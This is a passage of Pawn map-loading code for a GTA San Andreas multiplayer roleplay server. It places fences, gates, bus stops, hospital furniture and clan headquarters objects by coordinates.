	CreateDynamicObject(970, 1653.35522, -2258.69165, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1657.35596, -2258.67358, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1661.51440, -2258.67017, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1665.58411, -2258.66284, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1669.49304, -2258.61816, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1673.67688, -2258.65112, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1677.73779, -2258.71045, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1681.88721, -2258.71387, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1686.05737, -2258.70654, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1690.15979, -2258.70532, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1694.13367, -2258.67163, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1698.17419, -2258.63379, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1702.24072, -2258.62427, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1706.35791, -2258.62646, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1710.36450, -2258.60986, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1714.45447, -2258.63623, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1718.46899, -2258.63379, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1722.60315, -2258.61304, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1725.33105, -2258.58081, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1727.39685, -2260.63354, 12.78141,   0.00000, 0.00000, 89.16000);
	CreateDynamicObject(970, 1727.40259, -2264.64307, 12.78141,   0.00000, 0.00000, 89.16000);
	CreateDynamicObject(970, 1727.31812, -2268.80811, 12.78141,   0.00000, 0.00000, 89.16000);
	CreateDynamicObject(970, 1737.17603, -2270.62476, 12.78141,   0.00000, 0.00000, 89.78732);
	CreateDynamicObject(19425, 1642.93579, -2251.42847, 12.31231,   -0.12000, -0.06000, 270.34912);
	CreateDynamicObject(19425, 1642.93469, -2255.99463, 12.31231,   -0.12000, -0.06000, 270.34912);
	CreateDynamicObject(18647, 1642.25146, -2237.37524, 15.93297,   0.00000, 0.00000, 271.35760);
	CreateDynamicObject(1215, 1643.46411, -2249.09692, 13.01074,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1642.26453, -2249.11621, 13.01074,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1589.32471, -2239.52148, 13.05148,   0.00000, 0.00000, 269.37585);
	CreateDynamicObject(1215, 1589.15930, -2242.43164, 13.17363,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1589.04785, -2243.74756, 13.17363,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1589.11426, -2246.70313, 12.85048,   0.00000, 0.00000, 269.37585);
	CreateDynamicObject(7504, 1679.52625, -2253.65625, 13.28271,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7504, 1639.35388, -2253.63330, 13.78774,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(640, 1592.89038, -2253.56860, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1599.49646, -2253.60352, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1607.08643, -2253.63647, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1613.83923, -2253.61499, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1621.40186, -2253.62524, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1628.70496, -2253.62744, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1636.22668, -2253.74243, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1642.86780, -2253.65942, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1649.09058, -2253.64282, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1655.66626, -2253.65991, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1661.98169, -2253.65015, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1667.85840, -2253.72217, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1674.33716, -2253.80420, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1682.31848, -2253.90332, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1689.40552, -2253.88330, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1695.75903, -2253.94922, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1701.93677, -2253.98267, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1708.46240, -2253.98315, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1714.95557, -2253.98193, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(640, 1721.84119, -2253.90869, 14.13145,   0.00000, 0.00000, 270.11719);
	CreateDynamicObject(1568, 1725.23450, -2253.98779, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1718.33667, -2253.89429, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1711.75500, -2253.93823, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1705.13428, -2253.97681, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1698.78625, -2253.94897, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1692.62341, -2253.90698, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1685.76184, -2253.87646, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1678.55042, -2253.88354, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1671.18872, -2253.74634, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1658.94067, -2253.66089, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1664.90149, -2253.69434, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1652.40454, -2253.65405, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1646.27478, -2253.63770, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1639.67444, -2253.67725, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1632.69739, -2253.70386, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1625.16296, -2253.54785, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1617.98169, -2253.56445, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1610.59509, -2253.70581, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1603.41748, -2253.56812, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1596.05688, -2253.59204, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1568, 1589.01685, -2253.61475, 13.63254,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7504, 1634.36438, -2253.75317, 13.78774,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7504, 1634.20190, -2253.63159, 13.78774,   0.00000, 0.00000, 180.15659);
	CreateDynamicObject(1215, 1587.98865, -2253.33594, 12.97062,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1587.95093, -2253.52100, 12.97263,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1587.94336, -2253.73779, 12.97162,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1587.93408, -2253.94312, 12.97363,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1725.84326, -2253.26929, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.85754, -2253.43018, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.89197, -2253.59155, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.88635, -2253.75098, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.91772, -2253.99243, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.91260, -2254.13257, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.90674, -2254.29272, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.96118, -2254.45483, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.93921, -2254.51416, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.93115, -2254.73438, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.92822, -2254.81445, 12.96453,   0.00000, 0.00000, 0.30301);
	CreateDynamicObject(1215, 1725.81274, -2253.68286, 13.48779,   89.45996, 5.88001, 0.30301);
	CreateDynamicObject(1215, 1726.01257, -2254.45703, 13.48779,   89.45996, 5.88001, 0.30301);
	CreateDynamicObject(1215, 1587.93103, -2253.76929, 13.52210,   17.51999, 90.06001, 271.28497);
	CreateDynamicObject(1215, 1587.90344, -2254.17163, 12.97363,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7504, 1679.57751, -2253.57764, 13.78774,   0.00000, 0.00000, 180.15659);
	CreateDynamicObject(19425, 1614.04602, -2251.11353, 12.31231,   -0.12000, -0.06000, 270.34912);
	CreateDynamicObject(19425, 1613.83984, -2256.63184, 12.31231,   -0.12000, -0.06000, 270.34912);
	CreateDynamicObject(19425, 1590.90991, -2256.45117, 12.31231,   -0.12000, -0.06000, 270.34912);
	CreateDynamicObject(19425, 1591.07190, -2251.10303, 12.31231,   -0.12000, -0.06000, 270.34912);
	CreateDynamicObject(19425, 1591.07190, -2251.10303, 12.31231,   -0.12000, -0.06000, 270.34912);
	CreateDynamicObject(19425, 1590.90991, -2256.45117, 12.31231,   -0.12000, -0.06000, 270.34912);
	CreateDynamicObject(19425, 1613.83984, -2256.63184, 12.31231,   -0.12000, -0.06000, 270.34912);
	CreateDynamicObject(19425, 1614.04602, -2251.11353, 12.31231,   -0.12000, -0.06000, 270.34912);
    //----------PD
    CreateDynamicObject(3749, 1544.26, -1627.62, 18.36,   0.00, 0.00, -90.00);
CreateDynamicObject(1411, 1542.37, -1617.49, 17.02,   0.00, 0.00, 0.00);
CreateDynamicObject(1411, 1539.99, -1615.07, 17.02,   0.00, 0.00, -90.00);
CreateDynamicObject(1411, 1540.00, -1609.82, 17.02,   0.00, 0.00, -90.00);
CreateDynamicObject(1411, 1539.95, -1605.06, 17.02,   0.00, 0.00, -90.00);
CreateDynamicObject(1411, 1542.34, -1602.69, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1547.61, -1602.68, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1552.88, -1602.69, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1558.14, -1602.70, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1563.42, -1602.69, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1568.70, -1602.69, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1573.96, -1602.69, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1579.25, -1602.68, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1584.53, -1602.68, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1589.81, -1602.67, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1595.08, -1602.66, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1600.36, -1602.67, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1605.37, -1602.66, 17.02,   0.00, 0.00, 180.00);
CreateDynamicObject(1411, 1607.74, -1605.04, 17.02,   0.00, 0.00, 90.00);
CreateDynamicObject(1411, 1607.75, -1610.32, 17.02,   0.00, 0.00, 90.00);
CreateDynamicObject(1411, 1607.74, -1615.61, 17.02,   0.00, 0.00, 90.00);
CreateDynamicObject(1411, 1607.73, -1620.87, 17.02,   0.00, 0.00, 90.00);
CreateDynamicObject(1411, 1607.74, -1626.14, 17.02,   0.00, 0.00, 90.00);
CreateDynamicObject(1411, 1607.74, -1631.40, 17.02,   0.00, 0.00, 90.00);
CreateDynamicObject(1411, 1607.76, -1635.31, 17.02,   0.00, 0.00, 90.00);
CreateDynamicObject(1411, 1605.40, -1637.69, 17.02,   0.00, 0.00, 0.00);
CreateDynamicObject(1411, 1544.49, -1621.21, 13.97,   0.00, 0.00, 90.00);
CreateDynamicObject(1411, 1544.58, -1635.38, 13.97,   0.00, 0.00, 90.00);
CreateDynamicObject(1295, 1969.34, -2159.45, 12.54,   0.00, 0.00, 0.00);
CreateDynamicObject(1295, 1969.34, -2159.45, 12.54,   0.00, 0.00, 0.00);
CreateDynamicObject(8168, 1572.24, -1620.27, 14.08,   0.00, 0.00, 16.00);
CreateDynamicObject(983, 1565.39, -1622.71, 13.24,   0.00, 0.00, 90.00);
CreateDynamicObject(983, 1565.40, -1617.74, 13.24,   0.00, 0.00, 90.00);
CreateDynamicObject(983, 1556.81, -1617.74, 13.24,   0.00, 0.00, 90.00);
CreateDynamicObject(983, 1550.40, -1622.76, 13.24,   0.00, 0.00, 90.00);
CreateDynamicObject(983, 1544.73, -1620.70, 13.24,   0.00, 0.00, 50.00);
CreateDynamicObject(983, 1556.81, -1622.75, 13.24,   0.00, 0.00, 90.00);
CreateDynamicObject(983, 1550.40, -1617.76, 13.24,   0.00, 0.00, 90.00);
CreateDynamicObject(1231, 1568.47, -1620.32, 13.85,   0.00, 0.00, 90.00);
CreateDynamicObject(1231, 1561.10, -1620.32, 13.85,   0.00, 0.00, 90.00);
CreateDynamicObject(1231, 1554.05, -1620.23, 13.85,   0.00, 0.00, 90.00);
CreateDynamicObject(1231, 1546.75, -1620.25, 13.85,   0.00, 0.00, 90.00);
CreateDynamicObject(1231, 1577.43, -1620.32, 13.85,   0.00, 0.00, 90.00);
CreateDynamicObject(1231, 1560.08, -1636.87, 13.85,   0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1570.72, -1636.88, 13.85,   0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1549.30, -1636.83, 13.85,   0.00, 0.00, 0.00);
CreateDynamicObject(983, 1572.29, -1632.99, 13.24,   0.00, 0.00, 90.00);
CreateDynamicObject(983, 1565.89, -1632.99, 13.24,   0.00, 0.00, 90.00);
CreateDynamicObject(983, 1559.49, -1633.00, 13.24,   0.00, 0.00, 90.00);
CreateDynamicObject(983, 1553.11, -1633.00, 13.24,   0.00, 0.00, 90.00);
CreateDynamicObject(18452, 1551.32, -1609.70, 15.18,   0.00, 0.00, 0.00);
CreateDynamicObject(1676, 1551.33, -1612.53, 13.87,   0.00, 0.00, 0.00);
CreateDynamicObject(1676, 1551.41, -1606.93, 13.87,   0.00, 0.00, 0.00);
CreateDynamicObject(10183, 1578.58, -1606.40, 12.40,   0.00, 0.00, 45.50);
CreateDynamicObject(3928, 1564.20, -1657.86, 27.42,   0.00, 0.00, 0.00);
CreateDynamicObject(3928, 1564.16, -1648.40, 27.42,   0.00, 0.00, 0.00);
CreateDynamicObject(3928, 1564.19, -1695.80, 27.42,   0.00, 0.00, 0.00);
CreateDynamicObject(3928, 1564.24, -1705.09, 27.42,   0.00, 0.00, 0.00);

    CreateObject(994, 1544.722290, -1624.088867, 12.335902, 0.000000, 0.000000, 90.000000);
    CreateObject(994, 1544.722290, -1638.969604, 12.645908, 0.000000, 0.000000, 90.000000);
    CreateObject(994, 1544.722290, -1638.969604, 12.075894, 0.000000, 0.000000, 90.000000);
    CreateObject(5043, 1582.31396, -1637.86646, 13.62540,   0.00000, 0.00000, 90.00000);
    //-----------------[Area51]-----------------------
    CreateObject(8148, 321.682098, 1978.552612, 19.680612, 0.000000, 0.000000, 180.000000);
    area1gate1 = CreateObject(969, 321.321075, 1897.642333, 16.636323, 0.000000, 0.000000, 270.000000);
    area2gate1 = CreateObject(969, 321.321075, 1897.642333, 19.806344, 0.000000, 0.000000, 270.000000);
    area3gate1 = CreateObject(969, 321.321075, 1897.642333, 22.946380, 0.000000, 0.000000, 270.000000);
    CreateObject(8263, 321.133911, 1828.918579, 19.657361, 0.000000, 0.000000, 270.000000);
    CreateObject(8263, 260.983947, 1783.626831, 19.657361, 0.000000, 0.000000, 180.000000);
    CreateObject(8263, 141.214035, 1783.626831, 19.657361, 0.000000, 0.000000, 180.000000);
    CreateObject(8263, 80.974128, 1991.289306, 19.657360, 0.000000, 0.000000, 90.000000);
    CreateObject(8210, 80.973709, 1903.871093, 22.860824, 0.000000, 0.000000, 90.000000);
    area1gate2 = CreateObject(969, 81.349678, 1922.567382, 16.657611, 0.000000, 0.000000, 90.000000);
    area2gate2 = CreateObject(969, 81.349678, 1913.806518, 16.657611, 0.000000, 0.000000, 90.000000);
    CreateObject(8210, 80.973709, 1885.769897, 19.640825, 0.000000, 0.000000, 90.000000);
    CreateObject(8263, 80.974128, 1843.957519, 19.657360, 0.000000, 0.000000, 90.000000);
    CreateObject(8263, 80.974128, 2003.279907, 19.657360, 0.000000, 0.000000, 90.000000);
    area1gate3 = CreateObject(969, 81.348129, 2063.251464, 16.505308, 0.000000, 0.000000, 90.000000);
    area2gate3 = CreateObject(969, 81.348129, 2072.024902, 16.505308, 0.000000, 0.000000, 90.000000);
    CreateObject(8210, 80.973709, 2053.085205, 22.670820, 0.000000, 0.000000, 90.000000);
    CreateObject(8210, 80.973709, 2108.420166, 19.640825, 0.000000, 0.000000, 90.000000);
    CreateObject(8263, 141.124053, 2135.929931, 19.657361, 0.000000, 0.000000, 0.000000);
    CreateObject(8263, 261.404174, 2135.929931, 19.657361, 0.000000, 0.000000, 0.000000);
    CreateObject(8148, 321.682098, 2053.662597, 19.680612, 0.000000, 0.000000, 180.000000);
    CreateObject(8148, 321.682098, 2056.674316, 19.680612, 0.000000, 0.000000, 180.000000);
    CreateObject(2930, 246.226196, 1864.058715, 19.570304, 0.000000, 90.000000, 38.099994);
    CreateObject(2930, 246.855712, 1864.552978, 19.570297, 0.000000, 90.000000, 38.099994);
    CreateObject(19380, 267.916076, 1884.504760, 16.532947, 0.000000, 90.000000, 0.000000);
    //=======================[bus stops LS]======================
    CreateObject(1257, 1816.76709, -2092.02515, 13.79210,   0.00000, 0.00000, 180.00000);
    CreateObject(1257, 1937.95142, -2172.92017, 13.75861,   0.00000, 0.00000, 270.00000);
    CreateObject(1257, 2285.27173, -1666.45190, 15.29514,   0.00000, 0.00000, 270.00000);
    CreateObject(1257, 2450.54395, -1450.51050, 24.16921,   0.00000, 0.00000, 270.00000);
    CreateObject(1257, 2696.51196, -1664.05505, 12.60540,   0.00000, 0.00000, 270.00000);
    CreateObject(1257, 2464.31738, 333.18216, 32.05622,   0.00000, 0.00000, 77.14684);
    CreateObject(1257, 2336.96899, 114.45519, 26.57359,   0.00000, 0.00000, 178.93408);
    CreateObject(1257, 1322.88770, 241.79866, 19.61356,   0.00000, 0.00000, 66.32629);
    CreateObject(1257, 207.07170, -1377.32446, 49.91250,   4.00000, 0.00000, 314.37219);
    CreateObject(1257, 926.99487, -961.57080, 38.67452,   0.00000, 0.00000, 105.18301);
    CreateObject(1257, 790.50671, -1092.72095, 24.30330,   -2.00000, 0.00000, 180.00000);
    CreateObject(1257, 1188.89526, -1356.04565, 13.71177,   0.00000, 0.00000, 180.00000);
    CreateObject(1257, 1522.79871, -1629.17542, 13.68899,   0.00000, 0.00000, 180.00000);
    CreateObject(1257, 1788.62158, -1738.98743, 13.68582,   0.00000, 0.00000, 269.77814);
    CreateObject(1257, 2238.27637, -1756.51270, 13.79497,   0.00000, 0.00000, 270.00000);
    CreateObject(1257, 2350.26245, -1476.65527, 23.92711,   0.00000, 0.00000, 0.00000);
    //===========================[bus stops LV]=====================================
    CreateObject(1257, 2114.49292, 1941.07129, 10.88920,   0.00000, 0.00000, 179.94926);
    CreateObject(1257, 1920.32166, 1720.02258, 10.98305,   0.00000, 0.00000, 89.82372);
    CreateObject(1257, 170.77365, 1159.38806, 14.82946,   0.00000, 0.00000, 63.39722);
    CreateObject(1257, 2134.78589, 1365.54163, 11.07388,   0.00000, 0.00000, 270.03812);
    CreateObject(1257, 2557.03955, 1305.44629, 11.02295,   0.00000, 0.00000, 269.92487);
    ///////////////////////////////////////////////////////////////////////////////////////
//  CreateObject(19458, 365.30042, -62.02403, 1004.60779,   0.00000, 90.00000, 269.00394);
//  CreateObject(19458, 365.28885, -61.92547, 1004.79681,   0.00000, 90.00000, 269.00394);
//  CreateObject(19458, 365.30042, -62.02403, 1004.91779,   0.00000, 90.00000, 269.00394);
    CreateObject(2942,1739.42907715,-1863.60400391,13.21771908,0.00000000,0.00000000,180.00000000); //object(kmb_atm1) (1)
    CreateObject(1340,1803.66345215,-1863.00000000,13.70374966,0.00000000,0.00000000,90.00000000); //object(chillidogcart) (1)
    //CreateObject(1341,1796.83776855,-1863.09997559,13.57850361,0.00000000,0.00000000,90.00000000); //object(icescart_prop) (1)
    CreateObject(2942,603.89001465,-1248.30200195,18.07040024,0.00000000,0.00000000,202.00000000); //object(kmb_atm1) (2)
    CreateObject(2942,2173.89990234,1417.50000000,10.70539951,0.00000000,0.00000000,270.00000000); //object(kmb_atm1) (1)
    CreateObject(1340,761.31323242,-1670.49377441,4.27147627,0.00000000,0.00000000,183.00000000); //object(chillidogcart) (2)
    //CreateObject(1341,761.98999023,-1678.82995605,4.11714745,0.00000000,0.00000000,181.00000000); //object(icescart_prop) (2)
    CreateObject(1340,1544.68994141,-1697.78222656,13.67446136,0.00000000,0.00000000,180.00000000); //object(chillidogcart) (3)
    //----------------------------------------------------------------------------------------
    CreateObject(1798,346.73440000,165.51530000,1013.18750000,0.00000000,0.00000000,270.00000000); // bed
    CreateObject(1798,346.73440000,163.01530000,1013.18750000,0.00000000,0.00000000,270.00000000); // bed
    CreateObject(1798,346.73440000,160.51530000,1013.18750000,0.00000000,0.00000000,270.00000000); // bed
    CreateObject(7927,345.70730000,157.30660000,1014.40750000,0.00000000,0.00000000,90.00000000); // wound hospital
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    barrierlv = CreateObject(968,2238.16210938,2450.41113281,10.71316910,0.00000000,90.00000000,90.00000000); //object(barrierturn) (1)
    barrierls = CreateObject(968,1544.69641113,-1630.79003906,13.00000000,0.00000000,89.00000000,90.00000000); //object(barrierturn) (2) -inchisa
    garagels = CreateObject(980,1588.38684082,-1638.21655273,13.69999981,0.00000000,0.00000000,0.00000000); //object(airportgate) (1) -LSPD Garage
    AreaGate = CreateObject(969, 209.79103, 1875.28442, 12.13354,   0.00000, 0.00000, 0.00000);
    garagelv = CreateObject(980,2335.28149414,2444.17993164,6.96999979,0.00000000,0.00000000,240.00000000); //object(airportgate) (2) -LVPD Garage
    garagelv1 = CreateObject(980,2294.00000000,2498.59155273,4.50000000,0.00000000,0.00000000,90.00000000); //object(airportgate) (3) -LVPD Garage
    //-------------------[EXAM]-----------------------
    CreateObject(10976, 1680.20654, -2173.97632, 12.88000,   0.00000, 0.00000, 179.89999);
    CreateObject(982, 1669.80164, -2162.75854, 13.21980,   0.00000, 0.00000, 89.90000);
    CreateObject(984, 1650.58826, -2162.75854, 13.17880,   0.00000, 0.00000, 89.90000);
    CreateObject(983, 1644.20105, -2162.75854, 13.21980,   0.00000, 0.00000, 89.90000);
    CreateObject(983, 1640.99902, -2165.93848, 13.21980,   0.00000, 0.00000, 0.00000);
    CreateObject(11015, 1632.15332, -2175.81396, 14.49490,   0.00000, 0.00000, 270.00000);
    CreateObject(1522, 1640.97278, -2178.13110, 12.58830,   0.00000, 0.00000, 90.00000);
    CreateObject(1522, 1623.37537, -2174.96240, 12.58830,   0.00000, 0.00000, 90.00000);
    //================[bus ls ]=================
    CreateObject(973, 1704.97754, -2072.78174, 13.56460,   0.00000, 0.00000, 90.00000);
    CreateObject(973, 1704.98584, -2072.77686, 13.56460,   0.00000, 0.00000, 270.00000);
    //Burgers---------------------------------------------------------------------------------
    CreateObject(2768,377.42333984,-66.50305939,1001.57128906,0.00000000,0.00000000,0.00000000); //object(cj_cb_burg) (1)
    CreateObject(2823,377.26834106,-66.73277283,1001.52899170,0.00000000,0.00000000,0.00000000); //object(gb_kitchtakeway01) (1)
    CreateObject(1337,0.00000000,0.00000000,0.00000000,0.00000000,0.00000000,0.00000000); //object(binnt07_la) (1)
    //LSPD HQ la arrest gates-----------------------------------------------------------------
    CreateObject(2930,266.38674927,83.82096863,1000.13000488,0.00000000,0.00000000,0.00000000); //object(chinatgate) (1)
    CreateObject(2930,266.38671875,83.82031250,1002.54998779,0.00000000,0.00000000,0.00000000); //object(chinatgate) (2)
    CreateObject(2930,266.39001465,88.32584381,1005.09997559,0.00000000,0.00000000,0.00000000); //object(chinatgate) (3)
    CreateObject(2930,266.39257812,88.32519531,1002.67590332,0.00000000,0.00000000,0.00000000); //object(chinatgate) (4)
    // Hospital down there--------------------------------------------------------------------
    CreateObject(14668,1172.08140000,-1323.23990000,1005.40280000,0.00000000,0.00000000,0.00000000); // 24/7
    CreateObject(3395,1184.06910000,-1317.06040000,1005.40280000,0.00000000,0.00000000,0.00000000); // operation pc
    CreateObject(3391,1184.06910000,-1321.06040000,1005.40280000,0.00000000,0.00000000,0.00000000); // operation pc
    CreateObject(3383,1180.76100000,-1318.17240000,1005.20280000,0.00000000,0.00000000,90.00000000); // operation bed
    CreateObject(2604,1180.45030000,-1330.66520000,1005.87280000,0.00000000,0.00000000,360.00000000); // registration pc
    CreateObject(2610,1176.92220000,-1332.31210000,1006.15280000,0.00000000,0.00000000,180.00000000); // registration files
    CreateObject(2202,1183.72350000,-1332.20640000,1005.40280000,0.00000000,0.00000000,180.00000000); // printer
    CreateObject(1797,1162.22660000,-1317.70130000,1005.40280000,0.00000000,0.00000000,0.00000000); // bed
    CreateObject(1797,1165.22660000,-1317.70130000,1005.40280000,0.00000000,0.00000000,0.00000000); // bed
    CreateObject(1797,1168.22660000,-1317.70130000,1005.40280000,0.00000000,0.00000000,0.00000000); // bed
    CreateObject(1797,1171.22660000,-1317.70130000,1005.40280000,0.00000000,0.00000000,0.00000000); // bed
    CreateObject(1797,1162.22660000,-1317.70130000,1005.40280000,0.00000000,0.00000000,180.00000000); // bed
    CreateObject(1797,1165.22660000,-1317.70130000,1005.40280000,0.00000000,0.00000000,180.00000000); // bed
    CreateObject(1797,1168.22660000,-1317.70130000,1005.40280000,0.00000000,0.00000000,180.00000000); // bed
    CreateObject(1797,1171.22660000,-1317.70130000,1005.40280000,0.00000000,0.00000000,180.00000000); // bed
    CreateObject(1726,1163.54140000,-1327.95950000,1005.40280000,0.00000000,0.00000000,90.00000000); // sofa
    CreateObject(1726,1167.54140000,-1327.95950000,1005.40280000,0.00000000,0.00000000,270.00000000); // sofa
    CreateObject(1726,1165.62340000,-1325.64870000,1005.40280000,0.00000000,0.00000000,0.00000000); // sofa
   
    //=--------------------------------------------------------------------------------------------------------=/
    CreateObject(1676, 999.12909, -937.74396, 42.98377,   0.00000, 0.00000, 8.05608);
    CreateObject(1676, 1001.97955, -937.36493, 42.98377,   0.00000, 0.00000, 8.05608);
    CreateObject(1676, 1006.00391, -936.82990, 42.98377,   0.00000, 0.00000, 8.05608);
    CreateObject(1676, 1009.19672, -936.45105, 42.98377,   0.00000, 0.00000, 8.05608);
    CreateObject(1497, -402.46393, -1420.55798, 25.39549,   0.00000, 0.00000, 0.00000);
    CreateObject(1497, -383.39468, -1438.11047, 25.31742,   0.00000, 0.00000, 271.15390);
    CreateObject(1497, -402.08197, -1432.69568, 25.32882,   0.00000, 0.00000, 0.00000);
// Map JG Clan HQ
CreateObject(971, 2234.12378, -1149.31348, 28.24552,   0.00000, 0.00000, -105.00000);
CreateObject(971, 2231.05762, -1143.80981, 28.40570,   0.00000, 0.00000, -17.76000);
TTgate = CreateObject(971, 2223.26318, -1141.12390, 28.34207,   0.00000, 0.00000, -16.86001);

// Map Evil Clan HQ

CreateObject(971, 2174.95093, -1829.74927, 14.26975,   0.00000, 0.00000, 0.00000);
CreateObject(971, 2175.31470, -1762.51538, 14.69943,   0.00000, 0.00000, 0.00000);
EVgate = CreateObject(971, 2184.17944, -1762.50415, 14.65228,   0.00000, 0.00000, 0.00000);
CreateObject(971, 2191.53174, -1765.53284, 14.55920,   0.00000, 0.00000, -46.44001);

CreateObject(972, 2192.10205, -1804.74963, 14.48061,   0.00000, 0.00000, 0.00000);
CreateObject(972, 2191.99829, -1779.83838, 14.44170,   0.00000, 0.00000, 0.00000);
CreateObject(972, 2145.42798, -1826.99573, 17.52674,   0.00000, 0.00000, -90.24000);
CreateObject(972, 2170.22485, -1826.89539, 17.50091,   0.00000, 0.00000, -88.97998);
